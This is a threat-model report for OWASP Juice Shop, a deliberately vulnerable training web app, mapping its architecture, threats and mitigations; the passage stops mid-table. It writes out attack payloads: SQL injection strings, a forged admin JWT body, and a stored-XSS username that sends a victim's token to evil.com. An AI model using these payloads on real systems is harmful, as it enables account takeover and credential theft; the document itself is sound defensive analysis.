# Threat Model — OWASP Juice Shop

> | | |
> |---|---|
> | **Project** | juice-shop v19.2.1 |
> | **Description** | Probably the most modern and sophisticated insecure web application |
> | **Author** | Björn Kimminich (bjoern.kimminich@owasp.org) |
> | **License** | MIT |
> | **Repository** | https://github.com/juice-shop/juice-shop |
> | **Homepage** | https://owasp-juice.shop |
> | **Runtime** | Node.js 20–22, Express 4, Angular 19, SQLite/Sequelize, MarsDB, TypeScript |
> | **Tags** | web security, owasp, pentest, vulnerable, ctf, broken, bodgeit |

---

## Changelog

_Append-only history of assessment runs. Most recent first._

### v2 — 2026-04-14 (full rebuild — resumed assessment)

- First complete threat-model.md generated as part of resumed Phase 11 finalization.
- **Threats:** 30 total (Critical: 5, High: 19, Medium: 6, Low: 0) across 5 components.
- **Re-analyzed:** auth-service, rest-api, frontend-spa, file-upload, admin-panel.

### v1 — 2026-04-14 (full — initial assessment)

- First assessment — 30 threats identified across 5 components.

---

## Table of Contents

1. [Management Summary](#management-summary)
2. [Critical Attack Chain](#critical-attack-chain)
3. [System Overview](#1-system-overview)
4. [Architecture Diagrams](#2-architecture-diagrams)
   - [2.1 System Context](#21-system-context)
   - [2.2 Technology Architecture](#22-technology-architecture)
   - [2.3 Security Architecture Assessment](#23-security-architecture-assessment)
5. [Attack Walkthroughs](#3-attack-walkthroughs)
6. [Assets](#4-assets)
7. [Attack Surface](#5-attack-surface)
   - [5.1 Unauthenticated Entry Points (8)](#51-unauthenticated-entry-points-8)
   - [5.2 Authenticated Entry Points (2)](#52-authenticated-entry-points-2)
8. [Trust Boundaries](#6-trust-boundaries)
9. [Identified Security Controls](#7-identified-security-controls)
10. [Threat Register](#8-threat-register)
    - [8.1 Critical (5)](#81-critical-5)
    - [8.2 High (19)](#82-high-19)
    - [8.3 Medium (6)](#83-medium-6)
    - [8.4 Low (0)](#84-low-0)
11. [Mitigation Register](#9-mitigation-register)
    - [P1 — Immediate](#p1--immediate)
    - [P2 — This Sprint](#p2--this-sprint)
    - [P3 — Next Quarter](#p3--next-quarter)
12. [Out of Scope](#10-out-of-scope)
13. [Appendix: Run Statistics](#appendix-run-statistics)

---

## Management Summary

### Verdict

🔴 **Critical — Juice Shop has systemic, intentional security failures at every layer.**

This is OWASP Juice Shop, a deliberately vulnerable application designed for security training. The threat model documents real, exploitable vulnerabilities as they exist in the codebase:

- **An RSA private key is committed in public source code** at `lib/insecurity.ts:24`, enabling anyone to forge admin JWT tokens without attacking the server.
- **SQL injection bypasses authentication entirely** on the login and search endpoints — unauthenticated access to any account including admin requires a single payload.
- **Remote code execution** is achievable by any registered user via the B2B order endpoint's prototype-pollution escape from the `notevil` sandbox.
- **Angular's DomSanitizer is deliberately bypassed** in five components, creating stored XSS vectors that steal JWT tokens directly from `localStorage`.

No production system should ship with these defects. Every finding in this report is confirmed evidence in source code.

### Top Threats

| Severity | ID | Description | Impact | Mitigation | Effort |
|----------|-----|-------------|--------|------------|--------|
| 🔴 Critical | [T-001](#t-001) | Hardcoded RSA private key enables offline JWT forgery for any role | Forge admin tokens without network access | [M-001](#m-001) — Remove hardcoded key | Low |
| 🔴 Critical | [T-002](#t-002) | SQL injection on login — unauthenticated admin access | Full authentication bypass | [M-002](#m-002) — Parameterize queries | Medium |
| 🔴 Critical | [T-003](#t-003) | alg:none JWT bypass via express-jwt 0.1.3 | Auth bypass without private key | [M-003](#m-003) — Upgrade express-jwt | Low |
| 🔴 Critical | [T-007](#t-007) | SQL injection on search — full DB extraction | All user passwords and emails | [M-002](#m-002) — Parameterize queries | Medium |
| 🔴 Critical | [T-008](#t-008) | RCE via prototype pollution in B2B order sandbox | Arbitrary server code execution | [M-007](#m-007) — Remove eval endpoint | High |
| 🟠 High | [T-004](#t-004) | MD5 password hashing — rainbow table crackable | All passwords cracked after SQL injection | [M-004](#m-004) — Upgrade to bcrypt | Medium |
| 🟠 High | [T-005](#t-005) | Hardcoded HMAC key for security answers | Account takeover without knowing answer | [M-005](#m-005) — Load from env | Low |
| 🟠 High | [T-010](#t-010) | IDOR — basket and data export without ownership | Access any user's basket/data | [M-009](#m-009) — Add ownership checks | Medium |
| 🟠 High | [T-016](#t-016) | Stored XSS via bypassSecurityTrustHtml in search | Session theft via localStorage | [M-014](#m-014) — Remove bypasses | Medium |
| 🟠 High | [T-020](#t-020) | XXE via noent:true in XML upload — file read | Arbitrary server file read | [M-016](#m-016) — Disable noent | Low |

_Legend: 🔴 Critical &nbsp; 🟠 High &nbsp; 🟡 Medium &nbsp; 🟢 Low_

### ⚠ Worst Case Scenarios

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 16px 20px; margin: 0;">

**Scenario 1 — Unauthenticated full database dump:** An attacker sends `GET /rest/products/search?q='%20UNION%20SELECT%20*%20FROM%20Users--` and receives every user's email and MD5 password hash. With rainbow tables, all passwords are cracked within minutes. No authentication is required. The attacker now owns every account.

**Scenario 2 — Offline admin token forgery:** The RSA private key committed to the public GitHub repository is extracted. The attacker signs a JWT with `{"data":{"id":1,"email":"admin@juice-sh.op","role":"admin"}}`. Every Express endpoint that calls `security.isAuthorized()` accepts this token as a valid admin session.

**Scenario 3 — Authenticated RCE to full server compromise:** A registered user sends a crafted `orderLinesData` payload to POST `/b2b/v2/orders` that escapes the `notevil` sandbox via prototype pollution. Arbitrary Node.js code runs with the application's process privileges, enabling file system access, environment variable extraction, and lateral movement within the container.

**Scenario 4 — Stored XSS admin panel takeover:** A registered user sets their username to `<img src=x onerror="fetch('https://evil.com/?t='+localStorage.token)">`. Every admin who opens the administration panel executes this payload, exfiltrating their JWT token to the attacker's server.

See the [Critical Attack Chain](#critical-attack-chain) for how these scenarios chain together.
</blockquote>

### Architecture Assessment

| Severity | Layer | Defect | Consequence | Enables |
|----------|-------|--------|-------------|---------|
| 🔴 | Secret Management | RSA private key hardcoded in source | Anyone with repo read access forges admin tokens | [T-001](#t-001) — JWT forgery |
| 🔴 | Data Layer | Raw SQL string interpolation in ORM calls | SQLi on all raw query paths | [T-002](#t-002) — Auth bypass, [T-007](#t-007) — DB dump |
| 🔴 | Application Logic | eval() sandbox escape via notevil | Authenticated user → RCE | [T-008](#t-008) — RCE |
| 🟠 | Authentication | JWT algorithm not enforced; express-jwt 0.1.3 | alg:none bypass without key | [T-003](#t-003) — Token forgery |
| 🟠 | Frontend | DomSanitizer bypassed in 5+ components | Stored and reflected XSS | [T-016](#t-016) — Stored XSS, [T-018](#t-018) — Admin XSS |
| 🟠 | Authorization | PUT /api/Products/:id isAuthorized commented out | Any user edits any product | [T-028](#t-028) — Product tampering |
| 🟠 | File Handling | ZIP extraction path check uses includes() not startsWith() | Path traversal overwrites files | [T-021](#t-021) — Path traversal |
| 🟡 | Network | No WAF, no API gateway, wildcard CORS | Single hop to any endpoint | [T-029](#t-029) — CORS abuse |

_Legend: 🔴 Critical &nbsp; 🟠 High &nbsp; 🟡 Medium_

### Mitigations

#### Prioritized Mitigations (P1 — Critical findings)

| Priority | Mitigation | Addresses | Effort |
|----------|-----------|-----------|--------|
| **P1 — Immediate** | [M-001](#m-001) — Remove hardcoded RSA private key | [T-001](#t-001) — JWT key forgery | Low |
| **P1 — Immediate** | [M-002](#m-002) — Parameterize all SQL queries | [T-002](#t-002) — Login SQLi, [T-007](#t-007) — Search SQLi | Medium |
| **P1 — Immediate** | [M-003](#m-003) — Upgrade express-jwt; enforce RS256 | [T-003](#t-003) — alg:none bypass | Low |
| **P1 — Immediate** | [M-004](#m-004) — Replace MD5 with bcrypt | [T-004](#t-004) — Weak hashing | Medium |
| **P1 — Immediate** | [M-005](#m-005) — Load HMAC key from environment | [T-005](#t-005) — Hardcoded HMAC key | Low |
| **P1 — Immediate** | [M-007](#m-007) — Remove B2B eval endpoint | [T-008](#t-008) — RCE | High |
| **P1 — Immediate** | [M-014](#m-014) — Remove bypassSecurityTrustHtml | [T-016](#t-016) — XSS, [T-018](#t-018) — Admin XSS, [T-019](#t-019) — Last-login XSS | Medium |
| **P1 — Immediate** | [M-016](#m-016) — Disable XXE in XML parser | [T-020](#t-020) — XXE file read | Low |

#### Follow-up Mitigations (P2/P3)

| Priority | Mitigation | Addresses | Effort |
|----------|-----------|-----------|--------|
| **P2 — This Sprint** | [M-006](#m-006) — Rate limit login endpoint | [T-006](#t-006) — Brute-force | Low |
| **P2 — This Sprint** | [M-008](#m-008) — Replace $where in order tracking | [T-009](#t-009) — NoSQL injection | Medium |
| **P2 — This Sprint** | [M-009](#m-009) — Enforce ownership checks | [T-010](#t-010) — IDOR basket, [T-014](#t-014) — Review IDOR | Medium |
| **P2 — This Sprint** | [M-010](#m-010) — Authenticate admin endpoints | [T-011](#t-011) — Config disclosure, [T-025](#t-025) — Metrics, [T-027](#t-027) — Token harvest | Low |
| **P2 — This Sprint** | [M-011](#m-011) — Protect /support/logs | [T-012](#t-012) — Log exposure, [T-026](#t-026) — Log access | Low |
| **P2 — This Sprint** | [M-015](#m-015) — Move JWT to httpOnly cookie | [T-017](#t-017) — Token theft | High |
| **P2 — This Sprint** | [M-017](#m-017) — Fix ZIP path traversal | [T-021](#t-021) — Path traversal | Low |
| **P2 — This Sprint** | [M-018](#m-018) — Restrict SSRF in image URL upload | [T-022](#t-022) — SSRF | Medium |
| **P2 — This Sprint** | [M-019](#m-019) — Remove unauthenticated directory listings | [T-023](#t-023) — FTP exposure, [T-024](#t-024) — Encryption keys | Low |
| **P2 — This Sprint** | [M-020](#m-020) — Re-enable isAuthorized on PUT /api/Products | [T-028](#t-028) — Product tampering | Low |
| **P3 — Next Quarter** | [M-012](#m-012) — Limit upload sizes + DoS protections | [T-013](#t-013) — YAML bomb, [T-030](#t-030) — Static DoS | Low |
| **P3 — Next Quarter** | [M-013](#m-013) — Fix open redirect allowlist | [T-015](#t-015) — Open redirect | Low |
| **P3 — Next Quarter** | [M-021](#m-021) — Restrict CORS + replace cookie secret | [T-029](#t-029) — CORS abuse | Low |

### Operational Strengths

| Control | What it provides | Limitation |
|---------|-----------------|------------|
| Docker containerization (non-root UID 65532) | Reduces blast radius of container-level compromise | No network policy; app still reachable on port 3000 from any source |
| Morgan + Winston HTTP access logging | Audit trail for all incoming requests | Logs are accessible unauthenticated at /support/logs |
| express-rate-limit on reset-password | Slows password-reset brute force | Absent from the login endpoint itself |
| Helmet.js (noSniff + frameguard) | Prevents MIME-sniffing and clickjacking | xssFilter disabled; no CSP header emitted |
| HMAC-SHA256 for security answers | Stronger than plaintext storage | Hardcoded key negates the protection |
| CycloneDX SBOM generation script | Software composition analysis baseline | SBOM not continuously monitored for new CVEs |
| Cypress E2E test suite | Functional regression coverage | No security-focused test cases (SQLi, XSS, JWT bypass) |

**Bottom line:** Juice Shop's operational controls are cosmetic. Logging exists but is unauthenticated. Rate limiting exists but only on password reset. Helmet is configured but with XSS protection disabled. Every strength has a structural counterpart that voids it.

---

## Critical Attack Chain

The following diagram shows how four Critical findings chain from public network access to full server compromise without any credentials.

```mermaid
graph LR
    ATK["Attacker\n(Public Internet)"]:::person

    subgraph STEP1["Step 1 — Information Gathering"]
        A1["GET /ftp\nDirectory listing\ndownload backups"]:::risk
        A2["GET /rest/admin/\napplication-configuration\nExtract OAuth client ID"]:::risk
    end

    subgraph STEP2["Step 2 — Authentication Bypass"]
        B1["POST /rest/user/login\n' OR 1=1--\nLogin as admin T-002"]:::risk
        B2["GET /rest/products/search\nUNION SELECT * FROM Users\nDump all credentials T-007"]:::risk
    end

    subgraph STEP3["Step 3 — Privilege Escalation"]
        C1["lib/insecurity.ts:24\nExtract hardcoded RSA key\nForge admin JWT T-001"]:::risk
    end

    subgraph STEP4["Step 4 — Code Execution"]
        D1["POST /b2b/v2/orders\nPrototype pollution\nRCE in Node.js T-008"]:::risk
    end

    ATK -->|"HTTP GET (unauthenticated)"| A1
    ATK -->|"HTTP GET (unauthenticated)"| A2
    ATK -->|"SQL injection payload"| B1
    ATK -->|"UNION SQLi (unauthenticated)"| B2
    B2 -->|"MD5 hashes cracked offline"| C1
    B1 -->|"Admin session active"| D1
    C1 -->|"Forged admin JWT"| D1
    D1 -->|"Node.js RCE"| E1["Full server\ncompromise"]:::risk

    classDef person fill:#08427B,stroke:#073B6F,color:#fff
    classDef system fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    %% Trust Boundary Key:
    %% STEP1 = Public unauthenticated HTTP
    %% STEP2 = SQL injection through Express to SQLite
    %% STEP3 = Offline key extraction from public GitHub
    %% STEP4 = Authenticated but unprivileged user escalating to RCE
```

**Key takeaway:** All four Critical findings are exploitable independently. Together they form a five-step chain from zero knowledge to full Node.js RCE, all starting from the public internet without credentials. See [Section 8.1 Critical](#81-critical-5) for the full threat register and [Section 9 P1](#p1--immediate) for immediate remediations.

| ID | Title | Component | Mitigation |
|----|-------|-----------|-----------|
| [T-001](#t-001) | Hardcoded RSA private key enables offline JWT forgery | Auth Service | [M-001](#m-001) — Remove hardcoded key |
| [T-002](#t-002) | SQL injection on login — unauthenticated admin access | Auth Service | [M-002](#m-002) — Parameterize queries |
| [T-003](#t-003) | alg:none JWT bypass via express-jwt 0.1.3 | Auth Service | [M-003](#m-003) — Upgrade express-jwt |
| [T-007](#t-007) | SQL injection on search — full DB extraction | REST API | [M-002](#m-002) — Parameterize queries |
| [T-008](#t-008) | RCE via prototype pollution in B2B order sandbox | REST API | [M-007](#m-007) — Remove eval endpoint |

---

## 1. System Overview

OWASP Juice Shop is a deliberately vulnerable Node.js/Express web application used for security training, CTF competitions, and penetration testing practice. It is maintained by the OWASP Foundation and published openly at https://github.com/juice-shop/juice-shop.

**Deployment context:** The application runs as a single Express monolith on Node.js (v20–22), serving an Angular 19 SPA from the same process. Data is persisted in SQLite via Sequelize ORM and MarsDB (an in-process MongoDB-like database). A Dockerfile is provided for container deployment. No API gateway, load balancer, or WAF is configured in the codebase.

**Users:** Public internet users (unauthenticated shoppers), registered customers, administrators, and security researchers/CTF participants.

**Complexity tier:** Moderate — a single deployable unit (Express monolith) serving both API and static SPA assets, with two databases (SQLite and MarsDB) and a file system interface. Components analyzed: Auth Service, REST API, Frontend SPA, File Upload, Admin Panel.

**Security posture:** The application intentionally implements every OWASP Top 10 vulnerability and beyond. All findings in this report are confirmed in source code. This is not a "might be vulnerable" report — every finding has a specific file and line number. The overall security architecture is critically deficient by design.

**Context sources:** None — `.threat-modeling-context.md` contained no external context or requirements YAML.

---

## 2. Architecture Diagrams

### 2.1 System Context

The Context view shows who interacts with the system, which external services it depends on, and which trust zones each actor sits in. The most important observation: every actor — including unauthenticated attackers — reaches the Express monolith directly on port 3000 with no API gateway, WAF, or rate limiting in front, AND the source code (including a hardcoded RSA private key) is publicly downloadable from GitHub.

```mermaid
graph TD
    classDef person fill:#08427B,stroke:#073B6F,color:#fff
    classDef system fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["Public Internet (untrusted)"]
        USER["Anonymous User"]:::person
        CUST["Registered Customer"]:::person
        ADMIN["Administrator"]:::person
        ATK["Attacker"]:::person
    end

    subgraph APP["Application Tier (port 3000 — no WAF/Gateway)"]
        %% component: rest-api
        JS["OWASP Juice Shop<br/>Node.js 24 / Express 4<br/>Angular SPA<br/>v19.x"]:::risk
    end

    subgraph DATA["Data Tier (in-process — no network boundary)"]
        %% component: data-layer
        SQLITE["SQLite<br/>Sequelize 6<br/>Users, Products, Orders"]:::risk
        MARSDB["MarsDB 0.6.11<br/>(NoSQL in-process)<br/>Order tracking, Feedback"]:::db
        FS["File System<br/>uploads/, logs/, ftp/, encryptionkeys/"]:::risk
    end

    subgraph OBS["Operational / Observability"]
        PROM["Prometheus Scraper<br/>scrapes /metrics (unauth)"]:::external
    end

    subgraph EXT["External Services & Supply Chain"]
        GITHUB["GitHub<br/>Public Source Repository<br/>(contains hardcoded RSA private key)"]:::external
        NPM["npm Registry<br/>Package source<br/>(no SCA in CI)"]:::external
        GOOGLE["Google OAuth<br/>Identity Provider<br/>(client ID exposed via config)"]:::external
        CHATTRAIN["Chatbot Training Data Host<br/>HTTPS URL from config/*.yml<br/>(runtime-configurable — SSRF vector)"]:::external
        WEB3["Web3 / Ethereum RPC<br/>Wallet / NFT module<br/>JSON-RPC over HTTPS"]:::external
    end

    USER -->|"HTTPS · unauthenticated · SPA assets"| JS
    CUST -->|"HTTPS · session · /rest/user/login"| JS
    CUST <-->|"WSS · Socket.IO · challenge events"| JS
    ADMIN -->|"HTTPS · session · /administration"| JS
    ATK -->|"HTTP · unauthenticated · SQLi / XSS / JWT forge"| JS
    ATK -->|"HTTPS · read source code + private key"| GITHUB
    JS -->|"SQL · in-process"| SQLITE
    JS -->|"NoSQL · in-process"| MARSDB
    JS -->|"File I/O · uploads + serve-index /ftp"| FS
    JS -->|"HTTPS · OAuth redirect"| GOOGLE
    JS -.->|"HTTPS GET · startup · training JSON"| CHATTRAIN
    JS -.->|"HTTPS JSON-RPC · wallet ops"| WEB3
    PROM -.->|"HTTPS GET /metrics · unauth"| JS
    NPM -.->|"build-time · npm install (no lockfile audit)"| JS

    %% Trust Boundary Key:
    %% Internet → App: no API gateway, no WAF, no global rate limiting
    %% App → Data: in-process SQLite/MarsDB — SQLi grants direct DB access (no network hop)
    %% App → FS: serve-index on ftp/, encryptionkeys/, logs/ — unauthenticated public listing
    %% External SaaS: HTTPS; Google OAuth client ID hardcoded in /rest/admin/application-configuration
    %% Supply chain: source code public on GitHub including RSA private key — offline JWT forgery viable
    %% Runtime-config URL: Chatbot training-data host is loaded from config/*.yml at startup — attacker-controllable if config is tampered
    %% WebSocket: Socket.IO on the same port 3000, no origin pinning beyond hardcoded localhost:4200
    %% Observability: /metrics exposed unauthenticated — information disclosure to any reachable scraper
```

**Key takeaway:** The application has five independent ingress or egress paths an attacker can use without authenticating at the app layer: the unprotected port 3000 (REST), the parallel Socket.IO WebSocket channel on the same port, the publicly accessible source code on GitHub (which contains the JWT signing key), the unauthenticated `/metrics` endpoint, and the unauthenticated serve-index directories for `ftp/`, `encryptionkeys/`, and `logs/`. The outbound chatbot training-data fetch is driven by a config-file URL — tampering the config file at rest turns startup into an SSRF or poisoning vector. There is no edge security tier of any kind.

### 2.2 Technology Architecture

The diagram below names the key technologies of the Juice Shop stack with their versions and the protocols between them. Full component detail (every middleware, every route handler, every store) is in the four layer tables directly after the diagram.

```mermaid
graph TB
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef warn fill:#FFE082,stroke:#F57F17,color:#000
    classDef ok   fill:#c8e6c9,stroke:#388e3c,color:#000

    Browser["Angular 19 SPA<br/>localStorage: JWT"]:::risk
    Docker["Docker<br/>distroless/nodejs24"]:::ok
    App["Node.js 24 · Express 4<br/>monolith on port 3000"]:::risk
    WS["Socket.IO 3.1<br/>same port 3000"]:::warn
    SQLite["SQLite 3 + Sequelize 6<br/>23 models · in-process"]:::risk
    MarsDB["MarsDB 0.6.11<br/>NoSQL · in-process"]:::risk
    FS["Local FS<br/>uploads/, ftp/, keys/, logs/"]:::risk
    EXT["External APIs (HTTPS)<br/>Google OAuth · Chatbot URL · Web3 RPC"]:::warn
    GitHub["GitHub (public repo)<br/>contains RSA private key"]:::risk

    Browser -->|"HTTPS + JWT (no TLS by default)"| Docker
    Browser <-->|"WSS (Socket.IO)"| WS
    Docker -->|"contains"| App
    App --- WS
    App -->|"SQL · in-process"| SQLite
    App -->|"NoSQL · in-process"| MarsDB
    App -->|"File I/O · serve-index public on ftp/, keys/, logs/"| FS
    App -.->|"HTTPS · OAuth + startup fetch (config-driven) + JSON-RPC"| EXT
    GitHub -.->|"HTTPS · attacker reads source + private key"| Browser
```

**Key takeaway:** The application is a single Node.js/Express process that hosts both REST and WebSocket on the same port, talks to SQLite and MarsDB **in-process** (so injection in either is direct data access with no network hop), writes into file-system directories that are served unauthenticated, and fetches the chatbot training data from a config-file URL at startup. The only hardened node in this picture is the distroless Docker image; everything inside it is red.

#### 2.2.1 Layer 1 · Client

Browser-side runtime and client-held secrets. The SPA holds the session token in an XSS-accessible location, so any XSS anywhere in the application is session-stealing.

| # | Component | Version | Risk | Defect | Linked Threats |
|---|-----------|---------|------|--------|----------------|
| 1 | Angular SPA | 19 | 🔴 | `DomSanitizer.bypassSecurityTrustHtml` used in multiple components | [T-016](#t-016) — Stored XSS, [T-018](#t-018) — Admin XSS |
| 2 | localStorage | — | 🔴 | JWT stored there — XSS-accessible | [T-017](#t-017) — Token theft |

#### 2.2.2 Layer 2 · Middleware (request-flow order)

Cross-cutting Express pipeline — policy enforcement that runs on every request. Numbered in actual handler order: `cors → helmet → body-parser → morgan → express-jwt → rate-limit`.

| # | Component | Version | Risk | Defect | Linked Threats |
|---|-----------|---------|------|--------|----------------|
| 1 | cors | latest | 🔴 | wildcard origins | [T-029](#t-029) — CORS abuse |
| 2 | helmet | 4.x | 🟡 | xssFilter disabled, partial headers | |
| 3 | body-parser | latest | 🟢 | JSON + urlencoded + text | |
| 4 | morgan | latest | 🟢 | access logging only | |
| 5 | express-jwt | 0.1.3 | 🔴 | alg:none accepted; > 10y old | [T-003](#t-003) — alg:none bypass |
| 6 | express-rate-limit | 7.x | 🟡 | reset-pw only; login/search unthrottled | [T-006](#t-006) — Brute-force login |

#### 2.2.3 Layer 3 · Application Logic

Feature code that runs after the pipeline has accepted the request: route handlers, long-lived subsystems, security helpers.

| # | Component | Version | Risk | Defect | Linked Threats |
|---|-----------|---------|------|--------|----------------|
| 1 | routes/login.ts | — | 🔴 | raw SQL injection | [T-002](#t-002) — Auth bypass |
| 2 | routes/search.ts | — | 🔴 | raw SQL injection | [T-007](#t-007) — DB dump |
| 3 | routes/b2bOrder.ts | — | 🔴 | `vm` + notevil sandbox escape (RCE) | [T-008](#t-008) — RCE |
| 4 | routes/fileUpload.ts | — | 🔴 | XXE + ZipSlip | [T-020](#t-020) — XXE file read, [T-021](#t-021) — Path traversal |
| 5 | routes/userProfile.ts | — | 🔴 | SSTI via `eval()` | |
| 6 | lib/insecurity.ts | — | 🔴 | hardcoded RSA private key, HMAC key, MD5 | [T-001](#t-001) — JWT forgery, [T-004](#t-004) — Weak hashing |
| 7 | socket.io | 3.1 | 🟡 | CORS hardcoded to localhost:4200; challenge events | |
| 8 | juicy-chat-bot | ~0.9.0 | 🔴 | training JSON fetched from config URL at startup | |
| 9 | pdfkit | latest | 🔴 | writes order PDFs (PII) into publicly served `/ftp/` | |
| 10 | prom-client `/metrics` | latest | 🔴 | exposed without authentication | [T-025](#t-025) — Metrics disclosure |
| 11 | routes/ftp, encryptionkeys, logs | — | 🔴 | serve-index without auth | [T-011](#t-011) — Config disclosure, [T-027](#t-027) — Token harvest |
| 12 | + 55 more route handlers | — | 🟡 | see `threat-model.yaml` components[] | |

#### 2.2.4 Layer 4 · Data & Storage

Persistent and in-process data stores reachable from Layer 3 without leaving the process. No network boundary protects any of them.

| # | Component | Version | Risk | Defect | Linked Threats |
|---|-----------|---------|------|--------|----------------|
| 1 | Sequelize ORM | 6 | 🔴 | raw `sequelize.query()` with string interpolation | [T-002](#t-002) — Login SQLi, [T-007](#t-007) — Search SQLi |
| 2 | SQLite | 3 | 🟢 | 23 models; in-process with the Node app | |
| 3 | MarsDB (NoSQL) | 0.6.11 | 🔴 | `$where` operator enabled — NoSQL injection | [T-008](#t-008) — RCE |
| 4 | In-memory state | heap | 🔴 | `tokenMap`, challenges, notifications — no persistence, no revocation | |
| 5 | config/*.yml | — | 🟡 | holds chatbot training URL — tamper = startup SSRF | |
| 6 | uploads/ | — | 🟡 | multer writes; no size limit | |
| 7 | ftp/ | — | 🔴 | serve-index public — contains order PDFs with PII | [T-011](#t-011) — Config disclosure |
| 8 | encryptionkeys/ | — | 🔴 | serve-index public — exposes `jwt.pub` | [T-027](#t-027) — Token harvest |
| 9 | support/logs/ | — | 🔴 | serve-index public — access logs | [T-010](#t-010) — IDOR data leak |

### 2.2.1 Data Flow Matrix

The matrix below enumerates every protocol crossing that carries security-relevant data. Each flow is numbered stably (`F-01`, `F-02`…) so threats in Section 8 and mitigations in Section 9 can reference individual flows. Data classifications in brackets drive the Info-Disclosure / PII assessments in Section 2.3.6.

| # | Source | Destination | Protocol | Data / Classification |
|---|--------|-------------|----------|-----------------------|
| F-01 | User browser | `/rest/user/login` | HTTPS POST | Email + password `[credentials]` |
| F-02 | login.ts | Sequelize → SQLite | In-process SQL (string-interpolated) | User lookup `[credentials]` |
| F-03 | insecurity.ts | User browser | HTTPS cookie + header | JWT RS256 `[session credential]` |
| F-04 | User browser | `/rest/2fa/verify` | HTTPS POST | TOTP + tmp JWT `[credential]` |
| F-05 | User browser | `/rest/products`, `/rest/basket/:id/*` | HTTPS + JWT | Product / basket data `[PII-linked]` |
| F-06 | `/rest/basket/.../checkout` | pdfkit → `/ftp/` | Local FS write | Order PDF with name, address, card ref `[PII]` |
| F-07 | User browser | `/file-upload` | HTTPS multipart | Complaint ZIP/XML/YAML `[untrusted content]` |
| F-08 | fileUpload.ts | `/uploads/complaints/` | Local FS write | Extracted archive members `[untrusted content]` |
| F-09 | User browser | `/profile/image/file` | HTTPS multipart | Profile image — SSRF via URL variant `[untrusted content]` |
| F-10 | User browser | `/rest/chatbot/send` | HTTPS + JWT | User utterance `[untrusted text]` |
| F-11 | juicy-chat-bot | In-memory bot state | In-process | Per-user greeting / trust state `[operational]` |
| F-12 | juicy-chat-bot (startup) | External training host | HTTPS GET (URL from `config/*.yml`) | Training data JSON `[untrusted, runtime-configurable]` |
| F-13 | User browser | `/rest/orders/delivery-status` | HTTPS POST | `orderLinesData` evaluated by `vm` + notevil `[untrusted code]` |
| F-14 | Admin browser | `/rest/admin/*` | HTTPS + JWT (role=admin) | Config, user management, metrics `[admin]` |
| F-15 | User browser ↔ server | `/socket.io` | WSS | Challenge events, notifications `[public]` |
| F-16 | REST API | Web3 / Ethereum RPC | HTTPS JSON-RPC | Wallet operations `[external]` |
| F-17 | Prometheus scraper | `/metrics` | HTTPS GET (unauth) | Runtime metrics `[operational]` |
| F-18 | insecurity.ts | `/encryptionkeys/jwt.pub` | Local FS read | JWT verification key `[credential material]` |
| F-19 | Sequelize ORM | SQLite file | File I/O | All persisted rows `[PII · credentials hashes · orders]` |

Flows F-07, F-09, F-12, and F-13 are the untrusted-content entry points with the highest blast radius: XXE/ZipSlip in F-07 + F-08, SSRF in F-09, runtime-configurable outbound fetch in F-12, and sandbox-escape RCE in F-13.

### 2.2.2 In-Process Trust Boundaries

Network trust boundaries are enumerated in Section 6. The boundaries below are **in-process** crossings — they never leave the Node process but still represent trust-level changes and need their own enforcement statement.

| ID | Boundary | Enforcement today | Defect |
|----|----------|-------------------|--------|
| TB-IP-1 | Anonymous → Authenticated zone (within the Express process) | `express-jwt 0.1.3` on protected routes | Accepts `alg:none` → bypassable (T-002) |
| TB-IP-2 | Authenticated → Admin zone | `role === 'admin'` check on JWT-derived User record | No re-auth; stale JWT with admin role remains valid until 6h expiry |
| TB-IP-3 | Untrusted input → B2B VM sandbox | `notevil` + `vm.runInContext` timeout | Shares Node heap — sandbox escape = full RCE (T-008) |
| TB-IP-4 | Application logic → ORM → SQLite file | Sequelize parameterization | Bypassed in `login.ts` and `search.ts` by raw `sequelize.query()` with string interpolation (T-003) |
| TB-IP-5 | App → In-memory token/challenge/notification state | Process memory only | No persistence, no external revocation — tokens live entirely in heap; restart invalidates all sessions |
| TB-IP-6 | App → Local FS write into publicly served directories | OS file permissions | Writes from multer (uploads) and pdfkit (order PDFs) land in directories served by `serve-index` without auth (T-019) |

Fixing individual threats without also closing TB-IP-3, TB-IP-4, and TB-IP-6 leaves the same class of attack reachable through adjacent vectors.

### 2.3 Security Architecture Assessment

#### 2.3.1 Architecture Patterns

| Pattern | Status | Assessment |
|---------|--------|------------|
| API Gateway | ❌ Absent | The Express server accepts all traffic directly on port 3000 with no gateway layer. This means there is no centralized point for request validation, rate limiting, or WAF rules — each endpoint must implement its own protections, and many do not. |
| Defense-in-Depth | ❌ Absent | Security is applied inconsistently at the route level. Helmet is configured but XSS protection is disabled. CORS is global and unrestricted. Rate limiting exists only on the password reset endpoint. There is no second layer when the first fails. |
| Separation of Concerns | ⚠️ Partial | Routes are separated by function, but security logic is centralized in `lib/insecurity.ts`, which itself contains hardcoded secrets. Mixing business logic and security in a single module means a compromise of that file compromises all security primitives. |
| Least Privilege | ❌ Absent | Any authenticated user can call the B2B order endpoint that enables RCE. The `isAuthorized` middleware on PUT /api/Products/:id is commented out. No role differentiation beyond `admin`, `accounting`, and `deluxe` — and these roles are checked inconsistently. |
| Secrets Management | ❌ Absent | The RSA private key, HMAC key, and cookie secret are all hardcoded as string literals in source code. No environment variable loading, no secrets manager, no runtime injection. |
| Network Segmentation | ❌ Absent | All components run in the same Node.js process. SQLite and MarsDB are in-process. No internal network boundary exists between the web layer and the data layer. |
| Secure Defaults | ❌ Absent | The application ships with XSS protection disabled, CORS open to all origins, directory listings on sensitive paths, and logging accessible without authentication. Every default is insecure. |

**Assessment:** Juice Shop deliberately omits nearly every standard security architecture pattern. The codebase would require structural changes — not just patches — to achieve a defensible security posture. The absence of an API gateway, secrets management, and network segmentation means that individual code fixes (parameterized SQL, algorithm enforcement) are necessary but not sufficient.

#### 2.3.2 Key Architectural Risks

| Risk | Structural Risk | Why this matters | Linked Threats |
|------|----------------|-----------------|----------------|
